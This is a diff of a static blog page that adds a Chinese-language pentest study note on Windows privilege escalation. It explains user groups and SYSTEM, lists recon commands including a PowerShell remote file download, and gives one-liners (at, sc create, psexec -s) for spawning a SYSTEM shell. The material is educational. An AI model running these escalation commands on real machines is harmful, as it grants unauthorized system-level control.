@@ -824,6 +824,229 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://coldrainh.github.io/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="雨雾">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cr's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/10/09/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-Win%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%8F%8AAT&SC&PS%E6%8F%90%E6%9D%83/" class="post-title-link" itemprop="url">权限提升-Win溢出漏洞及AT&SC&PS提权</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-10-09 15:31:08" itemprop="dateCreated datePublished" datetime="2021-10-09T15:31:08+08:00">2021-10-09</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-10-13 15:37:03" itemprop="dateModified" datetime="2021-10-13T15:37:03+08:00">2021-10-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">内网渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" itemprop="url" rel="index"><span itemprop="name">权限提升</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">小迪安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>2.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p><strong>#知识点必备</strong><br /><strong>用户及用户组权限划分：Windows提权名</strong><br />Windows系统内置了许多本地用户组，这些用户组本身都已经被赋予一些权限（permissions），它们具有管理本地计算机或访问本地资源的权限。只要用户账户加入到这些本地组内，这些用户账户也将具备该组所拥有的权限。<br /><strong>0x01 普通权限</strong><br />默认情况下，系统为用户分了7个组，并给每个组赋予了不同的操作权限，管理员组（Administrator）、高权限用户组（Power Users）、普通用户组（Users）、备份操作组（Backup Operators）、文件复制组（Replicator）、来宾用户组（Guests），身份验证用户组（Ahthenticated users）其中备份操作组和文件复制组为维护系统而设置，平时不会被使用。<br />管理员组拥有大部分的计算机操作权限（并不是全部），能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）。再往下就是高权限用户组，这一部分用户也能做大部分事情，但是不能修改系统设置，不能运行一些涉及系统管理的程序。普通用户组则被系统拴在了自己的地盘里，不能处理其他用户的文件和运行设计管理的程序等。来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。身份验证用户组（Ahthenticated users）经过ms验证程序登陆的组均属于此组。<br /><br><br /><strong>0x02 特殊权限</strong><br />除了上面提到的7个默认权限分组，系统还存在一些特殊权限成员，这些成员是为了特殊用途而设置，分贝是：<strong>SYSTEM（系统）、Trustedinstaller（信任程序模块）、Everyone（所有人）、CREATOR OWNER（创建者）</strong>等，这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。<br />真正拥有“完全访问权”的只有一个成员：SYSTEM。这个成员是系统产生的，真正拥有整台计算机管理权限的用户，一般的操作是无法获取与它等价的权限的。<br />“所有人”权限与普通用户组权限差不多，它的存在是为了让用户能访问被标记为“公有”的文件，这也是一些程序正常运行需要的访问权限——任何人都能正常访问被赋予“Everyone”权限的文件，包括来宾组成员。<br />被标记为“创建者”权限的文件只有建立文件的那个用户才能访问，做到了一定程度的隐私保护。<br />但是，所有的文件访问权限均可以被管理员组用户和SYSTEM成员忽略，除非用户使用了NTFS加密。<br />无论是普通用户还是特殊用户，它们都可以“叠加”使用，“叠加”就是指多个权限共同使用，例如一个账户原本属于Users组，而后我们把他加入Administrators组在加入Trustedinstaller等权限提升，那么现在这个账户便同时拥有两个或多个权限身份，而不是用管理员权限去覆盖原来身份。权限叠加并不是没有意义的，在一些需要特定身份访问的场合，用户只有为自己设置了指定的身份才能访问，这个时候“叠加”的使用就能减轻一部分劳动量了。</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>systeminfo</td>
+<td>打印系统信息</td>
+</tr>
+<tr>
+<td>whoami</td>
+<td>获得当前用户名</td>
+</tr>
+<tr>
+<td>whoami /priv</td>
+<td>当前账户权限</td>
+</tr>
+<tr>
+<td>ipconfig</td>
+<td>网络配置信息</td>
+</tr>
+<tr>
+<td>ipconfig /displaydns</td>
+<td>显示DNS缓存</td>
+</tr>
+<tr>
+<td>route print</td>
+<td>打印出路由表</td>
+</tr>
+<tr>
+<td>arp -a</td>
+<td>打印arp表</td>
+</tr>
+<tr>
+<td>hostname</td>
+<td>主机名</td>
+</tr>
+<tr>
+<td>net user</td>
+<td>列出用户</td>
+</tr>
+<tr>
+<td>net user UserName</td>
+<td>关于用户的信息</td>
+</tr>
+<tr>
+<td>net use \SMBPATH Pa$$w0rd /u:UserName</td>
+<td>连接SMB</td>
+</tr>
+<tr>
+<td>net localgroup</td>
+<td>列出所有组</td>
+</tr>
+<tr>
+<td>net localgroup GROUP</td>
+<td>关于指定组的信息</td>
+</tr>
+<tr>
+<td>net view \127.0.0.1</td>
+<td>会话打开到当前计算机</td>
+</tr>
+<tr>
+<td>net session</td>
+<td>开放给其他机器</td>
+</tr>
+<tr>
+<td>netsh firewall show config</td>
+<td>显示防火墙配置</td>
+</tr>
+<tr>
+<td>DRIVERQUERY</td>
+<td>列出安装的驱动</td>
+</tr>
+<tr>
+<td>tasklist  /svc</td>
+<td>列出启动的服务</td>
+</tr>
+<tr>
+<td>dir /s foo</td>
+<td>在目录中搜索指定字符的项目</td>
+</tr>
+<tr>
+<td>dir /s too==bar</td>
+<td>同上</td>
+</tr>
+<tr>
+<td>net start</td>
+<td>列出启动的服务</td>
+</tr>
+<tr>
+<td>sc query</td>
+<td>列出所有服务</td>
+</tr>
+<tr>
+<td>sc qc ServiceName</td>
+<td>找到指定服务的路径</td>
+</tr>
+<tr>
+<td>shutdown /r /t 0</td>
+<td>立即重启</td>
+</tr>
+<tr>
+<td>type file.txt</td>
+<td>打印出内容</td>
+</tr>
+<tr>
+<td>icacls “C\Example”</td>
+<td>列出权限</td>
+</tr>
+<tr>
+<td>wmic qfe get Caption,Description,HotFixID,InstalledOn</td>
+<td>列出已安装的补丁</td>
+</tr>
+<tr>
+<td>(New-Object System.Net.WebClient).DownloadFile(“<a target="_blank" rel="noopener" href="https://host/file&quot;,&quot;C:/LocalPath&quot;">https://host/file&quot;,&quot;C:\LocalPath&quot;</a>)</td>
+<td>利用ps远程下载文件到本地</td>
+</tr>
+<tr>
+<td>accesschk.exe -qwsu “Group”</td>
+<td>修改对象（尝试Everyone，Authenticated Users和/或users）</td>
+</tr>
+</tbody></table>
+<p><strong>#案例1.如何判断使用哪种溢出漏洞？漏洞哪里找？</strong><br />信息收集-补丁筛选-利用MSF或特定EXP-执行-西瓜到手<br />Vulmap，Wes，WindowsVulnScan对比，exp在哪里获得？<br /><br><br /><strong>#案例2.如何判断使用那种数据库提权？数据库提权利用条件？</strong><br /><strong>MSF结合云服务器搭建组合拳？模拟上述操作演示？</strong><br /><strong>搭建：</strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/M0rta1s/p/11920903.html">https://www.cnblogs.com/M0rta1s/p/11920903.html</a><br /><br><br /><strong>#案例3.如何判断本地环境可利用漏洞情况？AT&amp;SC&amp;PS命令适用环境？</strong><br />Vulmap，Wes，WindowsVulnScan针对漏洞面，其他方法不同层面?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CVE-2020-0787 BitsArbitraryFileMoveExploit</span><br><span class="line">at 15:13 /interactive cmd.exe	#win2007以前的版本</span><br><span class="line"></span><br><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact	#适用版本（win7、8、08、12、16）</span><br><span class="line">sc start syscmd</span><br><span class="line"></span><br><span class="line">#ps命令</span><br><span class="line">psexec.exe -accepteula -s -i -d cmd.exe	# windows2008 </span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/efdadf8389ed80f996ea070b51f420ce.png" alt="image.png"><br><br />#案例给到的思路点总结如下： <br />1.提权方法有部分适用在不同环境，当然也有通用方法 <br />2.提权方法也有操作系统版本区分，特性决定方法利用面 <br />3.提权方法有部分需要特定环境，如数据库,第三方提权等<br>统版本区分，特性决定方法利用面 <br />3.提权方法有部分需要特定环境，如数据库,第三方提权等</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://coldrainh.github.io/2021/10/10/Xray%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E4%BB%8B%E7%BB%8D/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1109,7 +1332,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1150,7 +1373,7 @@
           <h3 class="widget-title">Tag Cloud</h3>
         <div id="myCanvasContainer" class="widget tagcloud">
             <canvas width="250" height="250" id="resCanvas" style="width=100%">
-                <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xray/" rel="tag">xray</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/" rel="tag">个人介绍</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">内网穿透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/" rel="tag">小迪安全</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" rel="tag">渗透测试工具</a><span class="tag-list-count">1</span></li></ul>
+                <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/" rel="tag">weblogic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xray/" rel="tag">xray</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E4%BB%8B%E7%BB%8D/" rel="tag">个人介绍</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">内网穿透</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/" rel="tag">小迪安全</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag">权限提升</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a><span class="tag-list-count">8</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" rel="tag">渗透测试工具</a><span class="tag-list-count">1</span></li></ul>
             </canvas>
         </div>
         </div>
@@ -1182,12 +1405,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">7k</span>
+    <span title="站点总字数">9k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">6 分钟</span>
+    <span title="站点阅读时长">8 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
